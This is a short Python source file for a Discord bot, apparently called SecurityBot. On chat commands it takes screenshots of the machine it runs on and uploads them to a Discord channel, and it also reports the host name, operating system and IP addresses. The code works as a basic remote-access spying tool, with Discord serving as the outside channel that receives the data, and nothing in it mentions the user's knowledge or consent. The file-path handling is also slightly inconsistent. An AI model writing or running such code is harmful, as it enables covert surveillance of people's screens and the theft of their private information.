import subprocess, os, time
import discord
from discord.ext import commands
from subprocess import call
from time import gmtime, strftime
import socket
import platform

client = discord.Client()



# gets ip address
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'     
    finally:
        s.close()
    return IP



# discord bot
@client.event
async def on_ready():
  print("Program has logged in as {0.user}".format(client))
  
@client.event
async def on_message(message):
  if message.author == client.user:
    return
  if client.user.mentioned_in(message):
    h_name = socket.gethostname()
    await message.channel.send('You mentioned '+h_name+'!')
    
  elif message.content.startswith("!quit"):
    await message.channel.send('Goodbye!')
    exit()


  # takes the screenshot  
  elif message.content.startswith("!screenshot"):
    import PIL.ImageGrab
    screenshot = PIL.ImageGrab.grab()
    screenshot.save("Windows_screenshot.jpg")
    for file in os.listdir("SecurityBot"):
      if file.endswith(".jpg"):
        await message.channel.send(file=discord.File(file))
        time.sleep(2)
        os.remove(file)

  # gets info about user's device
  elif message.content.startswith("!info"):
    time.sleep(5)
    h_name = socket.gethostname()
    IP_addres = socket.gethostbyname(h_name)
    await message.channel.send("**Operating System:** " + platform.system())
    await message.channel.send("**Host Name is:** " + h_name)
    await message.channel.send("**Computer IP Address (localhost) is:** " + IP_addres)
    await message.channel.send("**IP Address:** " + get_ip())
    
    

client.run('key goes here')
